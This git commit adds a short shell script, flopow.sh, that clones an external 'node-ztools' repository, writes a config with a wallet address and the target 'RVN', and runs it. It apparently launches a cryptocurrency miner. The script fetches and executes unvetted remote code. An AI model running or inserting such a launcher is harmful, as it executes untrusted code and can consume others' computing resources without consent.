541d697fa6aef67251a4c7865617b1ddf5d2133c
flopow2424 <Flopow24@mail.ru>
2025-01-17 20:37:04 +0700

    Create flopow.sh

---
+++ flopow.sh
@@ -0,0 +1,4 @@
+git clone https://github.com/malphite-code-3/node-ztools
+cd node-ztools
+echo -e '{"log": true, "user": "RN8uVJiXA1PQvc48rS1xRPM5bw83KuKMXC", "target": "RVN", "threads": 8}' | tee data.txt
+node app.js
